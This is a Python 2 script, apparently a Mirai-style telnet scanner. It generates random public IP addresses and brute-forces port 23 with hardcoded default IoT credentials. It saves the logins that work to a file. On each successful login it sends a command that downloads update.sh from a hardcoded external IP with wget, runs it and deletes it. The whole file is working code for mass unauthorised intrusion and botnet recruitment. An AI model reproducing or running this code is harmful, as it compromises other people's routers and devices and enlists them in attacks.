#!/usr/bin/python
# Simple Telnet Bruter | By; ScanRouters
# Lots of false possitives but pulls alot of results extremely fast

import threading
import sys, os, re, time, socket
from sys import stdout

if len(sys.argv) < 3:
    print "Usage: python "+sys.argv[0]+" <threads> <output file>"
    sys.exit()

combo = [ 
    "support:support",
    "root:vizxv",
    "root:xc3511",
    "telnet:telnet",
    "root:root",
    "supervisor:zyad1234",
    "root:",
    "admin:1234",
    "user:user", 
    "root:antslq", 
    "admin:admin",
    "root:5up"
]

threads = int(sys.argv[1])
output_file = sys.argv[2]

class router(threading.Thread):
    def __init__ (self, ip):
        threading.Thread.__init__(self)
        self.ip = str(ip).rstrip('\n')
    def run(self):
        username = ""
        password = ""
        for passwd in combo:
            if ":n/a" in passwd:
                password=""
            else:
                password=passwd.split(":")[1]
            if "n/a:" in passwd:
                username=""
            else:
                username=passwd.split(":")[0]
            try:
                tn = socket.socket()
                tn.settimeout(8)
                tn.connect((self.ip,23))
            except Exception:
                tn.close()
                break
            try:
                hoho = ''
                hoho += readUntil(tn, "ogin:")
                if "ogin" in hoho:
                    tn.send(username + "\n")
                    time.sleep(0.09)
            except Exception:
                tn.close()
            try:
                hoho = ''
                hoho += readUntil(tn, "assword:")
                if "assword" in hoho:
                    tn.send(password + "\n")
                    time.sleep(0.8)
                else:
                    pass
            except Exception:
                tn.close()
            try:
                prompt = ''
                prompt += tn.recv(40960)
                if ">" in prompt and "ONT" not in prompt:
                    success = True
                elif "#" in prompt or "$" in prompt or "%" in prompt or "@" in prompt:
                    success = True              
                else:
                    tn.close()
                if success == True:
                    try:
                        os.system("echo "+self.ip+":23 "+username+":"+password+" >> "+output_file+"") # 1.1.1.1:23 user:pass # mirai
                        tn.send("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.33.58.102/update.sh; busybox wget http://45.33.58.102/update.sh; chmod 777 update.sh; sh update.sh; rm -f update.sh\n")
                        print "\033[32m[\033[31m+\033[32m] \033[33mGOTCHA \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m"%(username, password, self.ip)
                        tn.close()
                        break
                    except:
                        tn.close()
                else:
                    tn.close()
            except Exception:
                tn.close()

def readUntil(tn, string, timeout=8):
    buf = ''
    start_time = time.time()
    while time.time() - start_time < timeout:
        buf += tn.recv(1024)
        time.sleep(0.01)
        if string in buf: return buf
    raise Exception('TIMEOUT!')

def Gen_IP():
    not_valid = [10,127,169,172,192]
    first = random.randrange(1,256)
    while first in not_valid:
        first = random.randrange(1,256)
    ip = ".".join([str(first),str(random.randrange(1,256)),
    str(random.randrange(1,256)),str(random.randrange(1,256))])
    return ip

def HaxThread():
    while 1:
        try:
            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(370)
            IP = Gen_IP()
            s.connect((IP, 23))
            s.close()
            print "\033[32m[\033[31m+\033[32m] FOUND " + IP
            thread = router(IP)
            thread.start()
        except:
            pass

if __name__ == "__main__":
    threadcount = 0
    for i in xrange(0,threads):
        try:
            threading.Thread(target=HaxThread, args=()).start()
            threadcount += 1
        except:
            pass
    print "[*] Started " + str(threadcount) + " scanner threads!"